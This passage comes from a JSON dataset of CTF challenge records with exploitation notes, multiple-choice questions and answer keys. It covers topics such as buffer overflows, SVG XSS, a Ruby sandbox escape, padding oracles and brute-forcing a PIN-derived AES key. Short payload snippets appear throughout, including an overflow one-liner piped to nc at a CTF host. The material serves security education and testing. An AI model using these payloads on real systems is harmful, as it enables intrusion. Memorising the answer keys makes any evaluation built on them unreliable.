            "In a challenge where you receive feedback for each guess in the format of symbols indicating the presence, correct position, or absence of characters in a guessed word, which Python code segment correctly updates a wordlist by eliminating words that no longer match the given feedback?  - A. ```python def filter_words(feedback, guess, wordlist): for char in guess: if char not in feedback: wordlist.remove(char) return wordlist ``` - B. ```python def delete_incorrect(feedback, guess, wordlist): new_list = [] for word in wordlist: if guess in word and feedback.count('+') == word.count(guess): new_list.append(word) return new_list ``` - C. ```python def eliminate(res, guess, wl): result = [] for e in wl: flg = True for i in range(5): if res[i] == \"*\" or res[i] == \"+\": if guess[i] not in e: flg = False if res[i] == \"+\": if guess[i] != e[i]: flg = False if res[i] == \"-\": if guess[i] in e: flg = False if flg and e != guess: result.append(e) return result ``` - D. ```python def update_wordlist(feedback, guess, wordlist): return [word for word in wordlist if set(guess).issubset(set(word))] ```",
            "When dealing with a binary reverse engineering challenge and aiming to find a specific output such as a \"Correct!\" message, which Python snippet demonstrates the application of angr for efficiently reaching a desired state by exploring different execution paths?  - A. ```python import sys  def reach_goal(binary): address = 0x4512AB # Incorrect pseudocode for reaching a desired state if binary.execute(address): print(\"Goal reached\") ``` - B. ```python from random import choice  binary = \"binary_path\"  def guess_correct(binary): # Incorrect approach using random selection guesses = ['target', 'attempt', 'solution'] while True: if choice(guesses) == binary.solve(): print(\"Correct!\") break ``` - C. ```python import angr  proj = angr.Project(\"./scramble\")  target_addr = 0x40073E  state = proj.factory.entry_state() simgr = proj.factory.simgr(state) simgr.explore(find=target_addr) state = simgr.found[0] print(state.posix.dumps(0)) ``` - D. ```python def find_path_to_success(): # This is a generic function with no real use of angr or symbolic execution print(\"This is not how symbolic execution works.\") ```"
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Scrambled Eggs",
        "write_up": "dataset/raw/Scrambled Eggs.md",
        "type": "crypto",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": 499,
        "max_score": 2000,
        "difficulty": 0.2495,
        "knowledge": [
            "When dealing with encryption algorithms that involve character mapping and array rotations, understand the encryption mechanisms fully to accurately reverse them. One common tactic is reversing character mappings using a predefined map or character array, and applying inverse rotation based on the encryption steps. Applying the reverse operations in the correct order is crucial. For character re-mapping, one might implement a function like `dec2(text)` that inversely maps each encrypted character back to its original form based on the mapping used during encryption.\n   \n   Example payload (For `enc2` reversal):\n   ```python\n   def dec2(text, map):  \n       return ''.join(chr(map.index(char) + ord('a')) for char in text)  \n   ```",
            "In scenarios involving encryption or obfuscation techniques that use random numbers or operations with a degree of randomness, brute-forcing through possible outcomes can be a necessary approach, especially when certain steps in the encryption process are non-deterministic from an outside perspective (e.g., rotations based on random numbers). However, analyzing the parts of an algorithm that can be reversed without brute force is essential to reduce the problem space. For instance, reversing operations that append characters based on deterministic logic can often be done without brute force by understanding the transformation rules and applying the inverse operations accordingly.\n\n   Example payload (For reversing operations with appended characters):\n   ```python\n   def recover_key2(ekey2):  \n       k = ekey2[:14]  # Assuming first 14 chars are appended ones\n       # The rest of the function follows the logic to accurately deduce the original characters before appending\n   ```"
        ],
        "question": [
            "In the scenario where a piece of text has been encrypted using a custom character mapping encryption technique (`enc2` function), how would you correctly reverse this encryption if you are given the encrypted text and the mapping used for encryption? The encryption involved replacing each character with another character from a predefined list based on their ASCII values.  - A. Convert each character in the encrypted text to its corresponding ASCII value, subtract 97, and then map it back using the inverse of the original map. - B. Use the index function on the encrypted text to find the position of each character in the map, subtract 97, and replace it with the character at the corresponding position in the alphabet. - **C. For each character in the encrypted text, find its position in the map, and then replace it with the alphabet character at the same position (starting from 'a').** - D. Directly replace each character in the encrypted text with the character at the same position in a reversed version of the original map. ",
            "In the same challenge involving encryption with a degree of randomness in the algorithm, one step included appending 14 random characters to a key (`key2`) and then performing a certain transformation on the last 14 characters of the modified key. Assuming you have the encrypted key (`ekey2`) with the random characters already appended and modified accordingly, how would you approach reversing this particular step to recover the original key part (`key2`) before random characters were added and modified, without using brute force?  - A. Sequentially remove each of the first 14 characters from the encrypted key, assuming they are the random ones, and then invert the modification on the remaining part. - **B. Use the known structure of the encrypted key to deduce the effect of the appended characters on the latter half of the key, and then apply inverse operations based on this deduction.** - C. Apply a brute force method to generate all possible combinations of 14 characters, append each combination to the original half of the key, and check if the result matches the encrypted key. - D. Convert the entire encrypted key into ASCII values, perform a modulo operation with a prime number on each, and rearrange the results to guess the original order of the characters. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "seashells",
        "write_up": "dataset/raw/seashells.md",
        "type": "pwn",
        "competition": [
            "TJCTF/2020",
            "https://ctftime.org/event/928/tasks/"
        ],
        "score": 50,
        "max_score": 100,
        "difficulty": 0.5,
        "knowledge": [
            "In a challenge involving buffer overflow vulnerabilities, especially when the `gets` function is used, it's crucial to determine the proper buffer size to overwrite the return address. This can be achieved by using a cyclic pattern technique with a debugging tool like gdb to find where the program crashes, thereby identifying the offset. After locating the offset, the next step involves crafting a payload that overwrites the return address with the desired function's address to gain control over the program flow. In scenarios where security features like PIE (Position Independent Executable) and stack canaries are disabled, this method is particularly effective.\n   \n   Example payload segment: `payload = b'a'*offset + p64(shell_addr)`",
            "When the target binary has a specific function that grants desired access or functionality (e.g., a shell function that executes a system call to open a shell), and there's no PIE enabled, one can locate the function's address using a tool like gdb. The payload can then include this address to redirect execution flow directly to that function, effectively bypassing any intended logic or checks the program initially performs. This is especially applicable in scenarios where the binary directly includes a call to a critical function like `system()` without proper input validation or checks.\n\n   Example payload construction: `payload = b'a'*offset + p64(shell_addr)`"
        ],
        "question": [
            "In the context of a buffer overflow attack, when utilizing the `gets` function which does not perform boundary checks, what is the primary method to determine the correct buffer size needed to overwrite the return address? - A. Analyze the source code manually to estimate the buffer size. - B. Use a cyclic pattern technique with a debugging tool to find the crash point and calculate the offset. - C. Input increasingly large amounts of data until the program crashes to estimate buffer size. - D. Consult the program's documentation to find details on buffer sizes.",
            "When exploiting a binary that includes a specific function to grant desired access (e.g., a function to open a shell), and Position Independent Executable (PIE) is disabled, which of the following is a correct step in crafting an exploit payload? - A. Include random addresses in the payload hoping to hit the correct address of the function. - B. Use brute-force to guess the function's address and include it in the payload. - C. Locate the function's address using a tool like gdb and include this address in the payload to redirect execution flow. - D. Omit the function's address since PIE is disabled and it's not necessary for crafting the payload."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Secdriven",
        "write_up": "dataset/raw/Secdriven.md",
        "type": "web",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 500,
        "max_score": 233123.2321,
        "difficulty": 0.002144788382933543,
        "knowledge": [
            "In challenges involving Cross-Site Scripting (XSS) via SVG uploads, if the application previews uploaded SVG files in the browser, this can be used to execute XSS by embedding JavaScript code within the SVG. Specifically, in scenarios where previewing an SVG file is possible by appending a parameter (like `&preview=1`), an attacker can leverage this functionality to execute XSS payloads when the file is viewed in a context that does not adequately sanitize SVG content. Example payload within an SVG could be: \n```xml\n<svg onload=alert(1)>\n```",
            "In challenges related to subdomain takeover or generating collision domains, if the application logic involves hash calculations that include modifiable user-controlled inputs (e.g., user ID or file ID) and these hashes determine subdomain names, creating a large number of accounts or file shares can be exploited to generate collisions. This method exploits the finite output space of hash functions modulo a certain number (e.g., MODULO 17 or MODULO 100000 in the challenge), enabling an attacker to cover most or all possible domain names with a sufficiently large but achievable number of accounts or shares. Once a collision is found, it can be used for tasks like bypassing same-origin policies by tricking an admin into accessing a malicious subdomain that shares the same origin as the target domain."
        ],
        "question": [
            "When attempting a cross-site scripting (XSS) attack in a web application that allows SVG file uploads and previews them in the browser, what is a valid tactic for embedding malicious JavaScript code in an SVG file? - A. Adding a JavaScript `<script>` tag directly inside the SVG file. - B. Utilizing SVG's native event attributes, such as `onload`, to execute JavaScript. - C. Modifying SVG metadata to include malicious JavaScript. - D. Embedding an external JavaScript file using the SVG `<image>` tag.",
            "In a scenario where an application uses a hash function that includes user-controllable inputs to generate subdomain names, which strategy would effectively cause a collision in subdomain names to exploit subdomain takeover vulnerabilities? - A. Incrementing the `nonce` value in the URL to guess the next valid subdomain. - B. Generating a large number of accounts to cover the finite output space of the hash function using the modulo operation. - C. Changing the file's metadata to manipulate its hash calculation. - D. Using a single account to repeatedly create and delete files, attempting to reuse subdomain names."
        ],
        "answer": [
            "B.",
            "B."
        ]
    },
    {
        "name": "Secret and Ephemeral",
        "write_up": "dataset/raw/Secret and Ephemeral.md",
        "type": "web",
        "competition": [
            "DownUnderCTF/2022",
            "https://ctftime.org/event/1625/tasks/"
        ],
        "score": 478,
        "max_score": 500,
        "difficulty": 0.956,
        "knowledge": [
            "To retrieve private variables and constructor arguments from a smart contract deployed on the Ethereum blockchain, one can inspect the transaction that deployed the contract using a blockchain explorer or querying the node directly with tools like Web3. Specifically, for a contract deployed on Ethereum, the input data of the contract creation transaction contains the constructor arguments encoded in hexadecimal. This data can be decoded to extract the original parameters passed during contract deployment.",
            "The private storage variables of an Ethereum smart contract can be indirectly accessed by knowing the slot number where the data is stored. Solidity stores contract variables in a sequential manner starting from slot 0. However, accessing these variables directly is not straightforward due to the Ethereum Virtual Machine's (EVM) storage organization, but tools or scripts can be written using Web3 libraries in programming languages such as Python to interact with the storage. By calculating the correct slot number and using the `getStorageAt` function, one can retrieve even private variables from a deployed contract. \n\n```python\n# Accessing a private string variable in a smart contract\nslot_number = 3 # Example slot number where the private variable is stored\ncontract_address = '0xContractAddress' # Replace with actual contract address\nprivate_variable = web3.toText(web3.eth.getStorageAt(contract_address, web3.keccak(int(slot_number).to_bytes(32, 'big')).hex()))\nprint(private_variable)\n```"
        ],
        "question": [
            "In the context of Ethereum smart contracts, the constructor arguments are encoded in the input data of the contract creation transaction. Given you have the input data as a hexadecimal string from the contract creation transaction:  `0x6301e1338060015560c060405260046080908152636570696360e01b60a05260029061002b908261013c565b5034801561003857600080fd5b506040516106fd3803806106fd833981016040819052610057916101fb565b6003610063838261013c565b506003813360405160200161007a939291906102ca565b60405160208183030381529060405280519060200120600581905550505061035a565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806100c757607f821691505b6020821081036100e757634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561013757600081815260208120601f850160051c810160208610156101145750805b601f850160051c820191505b8181101561013357828155600101610120565b5050505b505050565b81516001600160401b038111156101555761015561009d565b6101698161016384546100b3565b846100ed565b602080601f83116001811461019e57600084156101865750858301515b600019600386901b1c1916600185901b178555610133565b600085815260208120601f198616915b828110156101cd578886015182559484019460019091019084016101ae565b50858210156101eb5787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b6000806040838503121561020e57600080fd5b82516001600160401b038082111561022557600080fd5b818501915085601f83011261023957600080fd5b81518181111561024b5761024b61009d565b604051601f8201601f19908116603f011681019083821181831017156102735761027361009d565b8160405282815260209350888484870101111561028f57600080fd5b600091505b828210156102b15784820184015181830185015290830190610294565b6000928101840192909252509401519395939450505050565b60008085546102d8816100b3565b600182811680156102f0576001811461030557610334565b60ff1984168752821515830287019450610334565b8960005260208060002060005b8581101561032b5781548a820152908401908201610312565b50505082870194505b50505094815260609390931b6001600160601b0319166020840152505060340192915050565b610394806103696000396000f3fe60806040526004361061004a5760003560e01c80631ac749ff1461004f57806323cfb56f146100775780637c46a9b014610081578063eb087bfb146100ae578063ecd424df146100c4575b600080fd5b34801561005b57600080fd5b5061006560015481565b60405190815260200160405180910390f35b61007f6100e4565b005b34801561008d57600080fd5b5061006561009c3660046101eb565b60046020526000908152604090205481565b3480156100ba57600080fd5b5061006560055481565b3480156100d057600080fd5b5061007f6100df366004610223565b61011e565b67016345785d8a000034116100f857600080fd5b33600090815260046020526040812080543492906101179084906102ee565b9091555050565b600083838360405160200161013593929190610315565b60405160208183030381529060405280519060200120905060055481146101985760405162461bcd60e51b81526020600482015260136024820152720a6dedacae8d0d2dccee640eee4dedcce40745606b1b604482015260640160405180910390fd5b6040514790339082156108fc029083906000818181858888f193505050501580156101c7573d6000803e3d6000fd5b505050505050565b80356001600160a01b03811681146101e657600080fd5b919050565b6000602082840312156101fd57600080fd5b610206826101cf565b9392505050565b634e487b7160e01b600052604160045260246000fd5b60008060006060848603121561023857600080fd5b833567ffffffffffffffff8082111561025057600080fd5b818601915086601f83011261026457600080fd5b8135818111156102765761027661020d565b604051601f8201601f19908116603f0116810190838211818310171561029e5761029e61020d565b816040528281528960208487010111156102b757600080fd5b826020860160208301376000602084830101528097505050505050602084013591506102e5604085016101cf565b90509250925092565b8082018082111561030f57634e487b7160e01b600052601160045260246000fd5b92915050565b6000845160005b81811015610336576020818801810151858301520161031c565b50919091019283525060601b6bffffffffffffffffffffffff1916602082015260340191905056fea2646970667358221220c558120b35ab560caa833f878d167e3c94af9005d6dea322262181580b0f895864736f6c634300081100330000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000`  How can you decode the constructor arguments from this input data for further analysis? - A.Use an online hexadecimal to ASCII converter for the entire input data - B.Decode the input using Solidity's `decode` function with proper types specified - C.Use the Web3.js library's `web3.eth.abi.decodeParameters` function with the known contract ABI - D.Extract the last part of the input data and convert the hexadecimal values directly to the constructor argument's data types",
            "In the challenge, private storage variables of an Ethereum smart contract are accessed via interacting with the Ethereum blockchain. Given a contract deployed with a private string variable `not_yours` stored at a specific slot, which Python code snippet properly retrieves the value of this variable using Web3.py?  ```python slot_number = 3 # Placeholder for actual slot number where variable is stored contract_address = '0xContractAddress' # Replace with actual contract address ```  - A.`web3.eth.getStorageAt(contract_address, slot_number)` - B.`web3.toText(web3.eth.getStorageAt(contract_address, web3.keccak(int(slot_number).to_bytes(32, 'big')).hex()))` - C.`web3.toHex(web3.eth.getStorageAt(contract_address, slot_number))` - D.`web3.eth.getStorageAt(contract_address, web3.keccak(slot_number))`"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Secret Mailer Service 2",
        "write_up": "dataset/raw/Secret Mailer Service 2.0.md",
        "type": "pwn",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing a Ruby sandbox environment with restrictions like `$SAFE=3`, which limits object's operations based on their taint level, the `Fiddle::Pointer` class can be utilized as it does not perform taint checking. This property can facilitate arbitrary memory read and write operations, enabling the bypass of sandbox restrictions. This can be applied under conditions where the Ruby version is below 2.3, as the `$SAFE` feature has been deprecated in later versions. Additionally, the knowledge of libc offsets and memory structure is crucial for constructing exploit payloads to manipulate memory or execute arbitrary code.\n   - Example payload construct snippet:  \n   ```ruby\n   libc_base = main_arena - libc_offset[\"main_arena\"]\n   ptr = Fiddle::Pointer.malloc(0x200, libc_base + libc_offset[\"setcontext\"])\n   ```",
            "In WebAssembly-based challenges, exploiting vulnerabilities such as off-by-one buffer overflows can lead to arbitrary code execution due to specific characteristics like the lack of readonly memory and the unique handling of function pointers. Specifically, exploiting the dlmalloc mechanism used by Emscripten and manipulating WebAssembly's indirect call mechanism (e.g., `call_indirect`) are viable strategies. The exploitation process might involve creating overlapping chunks to overwrite critical data or function pointers, ultimately leading to arbitrary write or code execution. This approach works under the conditions where the WebAssembly binary is compiled with Emscripten and contains the specified vulnerabilities.\n   - Example steps for exploitation:\n     1. Use off-by-one overflow to create overlapping chunks.\n     2. Overwrite critical function pointers or data to divert control flow or modify memory.\n     3. Execute arbitrary functions or code by correctly setting up the memory and function table indices in WebAssembly."
        ],
        "question": [
            "In the context of bypassing `$SAFE=3` restrictions in a Ruby sandbox environment using `Fiddle::Pointer`, which of the following approaches is viable for reading and writing arbitrary memory without taint checking? - A. Utilizing Ruby's built-in `String` manipulation methods to bypass taint checking. - B. Leveraging the `Fiddle::Pointer` class to perform read and write operations on arbitrary memory addresses. - C. Using regular expressions to sanitize input and bypass sandbox restrictions. - D. Applying mathematical operations on tainted objects to remove taint. ",
            "Given a scenario where a WebAssembly binary compiled with Emscripten is vulnerable to an off-by-one buffer overflow, which strategy can be used to exploit this vulnerability for arbitrary code execution, considering the absence of readonly memory and specific handling of function pointers? - A. Overwriting the WebAssembly binary's metadata to force the execution of chosen code segments. - B. Injecting custom WebAssembly modules at runtime to gain execution control. - C. Using the off-by-one buffer overflow to create overlapping chunks, then overwrite function pointers or critical data. - D. Modifying the execution stack directly to redirect function calls to attacker-controlled memory regions. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Secret Message 1",
        "write_up": "dataset/raw/Secret Message 1.md",
        "type": "forensics",
        "competition": [
            "UofTCTF/2024",
            "https://ctftime.org/event/2219/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "To uncover hidden content in PDF files, utilize an editor to directly manipulate or remove elements such as color overlays. This method can reveal text that has been visually obscured but not removed from the document.",
            "For extracting text from PDF files where content is not selectable or appears hidden, using a browser's built-in features like text selection or the \"Read Aloud\" function can surface hidden messages. Browsers can interpret PDF structures differently than PDF viewers, potentially bypassing certain visual obfuscations."
        ],
        "question": [
            "When attempting to uncover hidden content in a PDF file where the flag is visually obscured by being colored the same as the background (e.g., black text on a black background), which approach enables direct manipulation of the document's elements to reveal the hidden text? - A. Increasing the contrast and brightness of the display screen. - B. Utilizing a PDF editor to modify or remove the color overlay concealing the text. - C. Printing the PDF and using a highlighter on the paper. - D. Changing the screen resolution to see if the text becomes visible.",
            "In scenarios where a PDF file's text appears unselectable or hidden, and traditional text selection tools are ineffective, which browser capability could potentially reveal the hidden text without directly editing the PDF file? - A. Utilizing the browser\u2019s zoom function to enlarge the text size. - B. Using the browser's \"Inspect Element\" function to modify the HTML. - C. Opening the PDF in a browser and employing the \"Read Aloud\" function. - D. Saving the PDF as a webpage and then re-opening it."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Secret Pwnhub Academy Rewards Club",
        "write_up": "dataset/raw/Secret Pwnhub Academy Rewards Club.md",
        "type": "pwn",
        "competition": [
            "Hack.lu/2020",
            "https://ctftime.org/event/1142/tasks/"
        ],
        "score": 194,
        "max_score": 500,
        "difficulty": 0.388,
        "knowledge": [
            "In challenges involving stack-based buffer overflows, if a stack leak is provided, one can overwrite the stored instruction pointer (IP) to facilitate arbitrary code execution. This scenario often involves jumping back to an attacker-controlled input stored at a leaked stack address. This method requires identifying the offset to the stored IP relative to the beginning of the buffer. Example approach: Calculate the distance between the buffer start and stored IP, then place the shellcode at the beginning of the buffer and overwrite the stored IP with the leaked stack address pointing to the shellcode.",
            "When exploiting binary vulnerabilities on specific architectures like SPARC, utilizing architecture-specific shellcode and understanding the architecture's register use and calling conventions are crucial. This includes knowing how to control important registers (e.g., instruction pointer or equivalent in SPARC) based on the binary's execution flow. For SPARC binaries, leveraging online resources such as SPARC assembly guides or shellcoding examples can help in crafting or adapting shellcode suitable for the target environment. Example SPARC shellcode can be found in resources such as exploit-db or architecture-specific documentation and needs to be adjusted to the context of buffer size, available gadgets, and end goals of the exploitation process."
        ],
        "question": [
            "In a scenario involving a stack-based buffer overflow where you're given a stack leak that exposes the address of a vulnerable buffer (`auStack128`), how would you achieve arbitrary code execution? - A. Overwrite the stored instruction pointer with the address of a function located within the binary that performs a non-privileged action. - B. Calculate the offset from the buffer to the stored instruction pointer and inject NOPs (No Operation) until reaching the return address space. - C. Use the leaked stack address to overwrite the stored instruction pointer with an address pointing to attacker-controlled input, such as shellcode placed at the beginning of the buffer. - D. Fill the buffer with random characters to cause a segmentation fault, triggering a debugger to inject the shellcode automatically.",
            "When exploiting a buffer overflow in a SPARC architecture binary, which of the following factors is most crucial for successfully leveraging architecture-specific shellcode? - A. Modifying the shellcode to perform arithmetic operations using SPARC's unique set of registers and ensuring it respects the architecture's endianness. - B. Incorporating NOP slides extensively around the shellcode to increase its execution reliability despite stack address randomization. - C. Understanding and controlling important SPARC registers, especially those involved in instruction flow control, by tailoring the shellcode to manipulate these registers effectively. - D. Increasing the payload size significantly to ensure that the stack is entirely overwritten, making the binary execution flow entirely dependent on the injected shellcode."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Secret Server Revenge",
        "write_up": "dataset/raw/Secret Server Revenge.md",
        "type": "crypto",
        "competition": [
            "HITCON/2017/Quals",
            "https://ctftime.org/event/485/tasks/"
        ],
        "score": 334,
        "max_score": 450,
        "difficulty": 0.7422222222222222,
        "knowledge": [
            "When facing challenges involving encryption with unknown plaintext and a limitation on the number of requests you can make to the server, consider employing cryptographic oracles. Specifically, use the behavior of padding and unpadding mechanisms (such as those involved in PKCS#7) to deduce information about the plaintext. For instance, manipulating encrypted messages to observe changes in the unpadding process can reveal the value of the last byte of a plaintext block.\n    - Example approach: Craft a message that, when decrypted and unpadded, reveals the length of the unpadded data. Send variations of this message by changing its ending, which affects the unpadding behavior, and use the server's response to infer the actual unpadding length, thereby deducing information about the plaintext.",
            "Leverage the predictability of cryptographic hash functions (like MD5) in scenarios where direct decryption is impractical or impossible due to limitations (e.g., request limits). By obtaining encrypted hashes of data at different truncation lengths and comparing these against a set of precomputed hash values derived from potential plaintext candidates, it's possible to progressively narrow down the original data.\n    - Example strategy: Generate a list of possible plaintext values by hashing candidates and matching the resulting hashes against known encrypted hash values obtained from the server. Start with broad matches based on the last byte of the hash and progressively refine the candidates by applying constraints from additional observed data. This technique effectively reduces the pool of possible plaintexts without direct decryption."
        ],
        "question": [
            "In an encryption system that implements PKCS#7 padding, you are analyzing an encrypted message to determine information about the plaintext. Given that the padding can unpad up to 256 characters based on the value of the last byte in the last block, which of the following methods would allow you to identify the value of the last byte of plaintext? - A. Alter the first byte of the message and observe changes in the message size after encryption. - B. Change the encryption key and compare the differences in the encrypted messages. - C. Craft a message that, after decryption and unpadding, changes length based on the last byte's value, and use responses to guess the byte. - D. Convert the encrypted message into a different encoding format and analyze the padding. ",
            "When attempting to deduce the original data from encrypted hashes without direct decryption, specifically using MD5 hashes at various truncation lengths, which approach would be most effective given a server with a request limit? - A. Decrypt each hash directly by guessing and checking each possible plaintext against the server until a match is found. - B. Generate a wide range of potential plaintexts, hash each one, and match these against known encrypted hash values from the server to narrow down the possibilities. - C. Increase the number of requests to the server by bypassing the limit, allowing for direct brute force of the encrypted hashes. - D. Choose a random subset of encrypted hashes and attempt to match these against a list of commonly used passwords. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Secret Society",
        "write_up": "dataset/raw/Secret Society.md",
        "type": "This is a **pwn** challenge.",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving buffer overflow vulnerabilities, one must closely examine the program's buffer allocation and manipulation methods. If the program reads user input into a buffer without adequate bounds checking, it can be susceptible to a buffer overflow attack. This vulnerability can be exploited by providing input that exceeds the buffer size, potentially overwriting adjacent memory. In the provided example, `fgets` is used to read more data into the buffer `local_d8` than it can hold, without checking the size of the input.",
            "To successfully exploit a buffer overflow vulnerability and manipulate the program's behavior or extract data from adjacent memory locations, carefully calculate the total amount of data to provide as input. This typically involves filling up the target buffer, and possibly overwriting subsequent buffers or variables in memory, until reaching a point of interest (e.g., a variable holding sensitive data or a return address). In the given scenario, the input crafted to exploit the buffer overflow consisted of filling up the input buffer `local_d8`, the `uStack200` variable, and the `auStack196` array with precise amounts of data to ensure that a null terminator (`\\0`) is positioned exactly at the beginning of the buffer holding the flag (`local_58`). This manipulation causes the program to print out the contents of `local_58`, including the flag, when outputting the supposedly safe `local_d8` buffer content.\n\nExample payload to trigger the overflow and read the flag:  \n```perl\nperl -e 'print \"A\"x16 . \"B\"x4 . \"C\"x108' | nc chall.csivit.com 30041\n```"
        ],
        "question": [
            "In the context of analyzing a program for buffer overflow vulnerabilities, which function is correctly used in the scenario to read user input into the buffer `local_d8`, potentially leading to buffer overflow if not properly checked? - A. `scanf((char *)local_d8, \" %s\", stdin);` - B. `read(stdin, (char *)local_d8, 0x80);` - C. `fgets((char *)local_d8, 0x80, stdin);` - D. `getline(&local_d8, &size, stdin);`",
            "When crafting an input for a buffer overflow exploit, what is the correct order and reason for filling specific buffers to manipulate a program's memory to reveal sensitive information, following the scenario provided? - A. Fill `local_58`, `uStack200`, then `auStack196` to directly overwrite memory locations of interest. - B. Fill `local_d8` with data larger than its capacity to automatically overflow to adjacent memory. - C. Fill `local_d8`, `uStack200`, then `auStack196` to ensure the null terminator is placed at a strategic memory location. - D. Overwrite `uStack200` first to misalign the stack and cause an unintentional buffer overflow."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Secure DES",
        "write_up": "dataset/raw/Secure DES.md",
        "type": "crypto",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": 464,
        "max_score": 500,
        "difficulty": 0.928,
        "knowledge": [
            "When faced with RSA encryption using a prime modulus (n=m and m is prime), the decryption process can be simplified by exploiting the property that `phi(m) = m-1`. This simplification is based on calculating the modular inverse of the exponent `e` with respect to `m-1` to find the decryption key `d`. If `gcd(e, m-1) != 1` due to `e` being even, it implies that a direct RSA decryption would result in a quadratic residue, necessitating the use of a `modular sqrt` operation to derive the actual plaintexts. However, this process will lead to two possible plaintexts for each ciphertext, akin to the Rabin Cryptosystem, where you calculate `modular_sqrt(pow(ciphertext, d, modulus), modulus)` to obtain potential plaintexts.\n   \n   Example usage:\n   ```python\n   from crypto_commons.rsa.rsa_commons import modinv, modular_sqrt\n   \n   def decrypt(ciphertext, modulus):\n       decryption_exponent = modinv(65536, modulus-1)\n       roots = modular_sqrt(pow(ciphertext, decryption_exponent, modulus), modulus)\n       return roots, modulus - roots\n   ```",
            "In scenarios where decrypted data includes concatenated elements (e.g., a key part and a distinct identifiable suffix), and when the correct order of these elements is unknown due to shuffling, an effective technique involves generating all potential suffixes and attempting to match these with the decrypted outputs. This technique hinges on the assumption of uniqueness or distinguishability of suffixes, allowing for the reassembly of the original data sequence by comparing and aligning the suffixes of decrypted values. This approach is particularly useful in encryption schemes where additional data (like a counter or unique ID) is appended or prepended to the plaintext before encryption.\n\n   Example application:\n   ```python\n   # Assuming decrypted1 and decrypted2 are potential outputs from the decrypt function mentioned in point 1\n   suffixes = [long_to_bytes(x) for x in range(0, 1024, 8)]\n   key_parts = []\n   L = []\n   for decrypted in [decrypted1, decrypted2]:\n       for suffix in reversed(suffixes):\n           if decrypted.endswith(suffix):\n               key_part = decrypted[:-len(suffix)]\n               key_part = '\\x00' * (8 - len(key_part)) + key_part\n               key_parts.append(key_part)\n               L.append(bytes_to_long(suffix))\n               break\n   ```"
        ],
        "question": [
            "If a RSA encryption scheme uses a prime modulus (n=m and m is prime), and an even encryption exponent (e), which method is correct for decrypting a ciphertext (c) to obtain potential plaintexts due to the peculiar nature of `gcd(e, m-1) != 1`?  - A. Calculate `d = modinv(e, phi(m))` and then directly calculate `plaintext = pow(ciphertext, d, m)` - B. Calculate `d = modinv(e, m-1)`, find `x = pow(ciphertext, d, m)` and solve `x^2 = plaintext mod m` to get plaintexts - C. Calculate `d = modinv(e, m-1)` and use `modular_sqrt(pow(ciphertext, d, m), m)` to get potential plaintexts - D. Use `modinv(e, m+1)` as `d`, and compute `plaintext = pow(ciphertext, 2*d, m)` ",
            "In the decryption of RSA-like encrypted values concatenated with an identifiable suffix where the order is shuffled, which technique is effective for associating the decrypted content with its original data parts?  - A. Match the prefix of each decrypted value with a list of known prefixes to determine the original data sequence - B. Use a brute force approach to test all possible combinations of decrypted values and suffixes - C. Convert each decrypted value to hexadecimal format and match against a precomputed list of hexadecimal suffixes - D. Reverse the list of potential suffixes, match the end of each decrypted value with these suffixes, and extract the corresponding data part based on this matching "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Secure Notes",
        "write_up": "dataset/raw/Secure Notes.md",
        "type": "This write-up describes a mobile challenge involving an Android application called Secure Notes. The challenge required analyzing the application's code and decrypting a file to retrieve sensitive information. Based on the provided details, the type of this CTF challenge would be **forensics**.",
        "competition": [
            "NahamCon/2022",
            "https://ctftime.org/event/1630/tasks/"
        ],
        "score": 485,
        "max_score": 2199,
        "difficulty": 0.22055479763528876,
        "knowledge": [
            "When dealing with encrypted files in mobile applications, if the encryption key is based on predictable user input (e.g., a four-digit PIN code), a brute force attack can be used to decrypt the file. This approach involves attempting every possible PIN code combination, appending or transforming it as needed (e.g., repeating it multiple times), and using it as the key to decrypt the file. The decryption attempt is considered successful if the decrypted content matches an expected format, such as containing specific keywords or being valid JSON.\n    - Example payload or approach: \n    ```java\n    SecretKeySpec secretKeySpec = new SecretKeySpec((pinCode+pinCode+pinCode+pinCode).getBytes(), \"AES\");\n    Cipher instance = Cipher.getInstance(\"AES\");\n    ```",
            "When extracting sensitive information from a decrypted database file in a mobile application challenge, ensure the correct parsing of the expected data structure (e.g., JSON). If the file is expected to contain JSON with specific fields (like notes or flags), confirm the presence of these fields after decryption to validate that the decryption was successful. This method is especially useful in scenarios where the encrypted data format is known and can be programmatically verified.\n    - Example validation snippet: \n    ```java\n    String content = new String(Files.readAllBytes(Paths.get(\"notes.db\")), StandardCharsets.UTF_8);\n    if(content.contains(\"notes\")) {\n        System.out.println(\"Successful decryption!\");\n    }\n    ```"
        ],
        "question": [
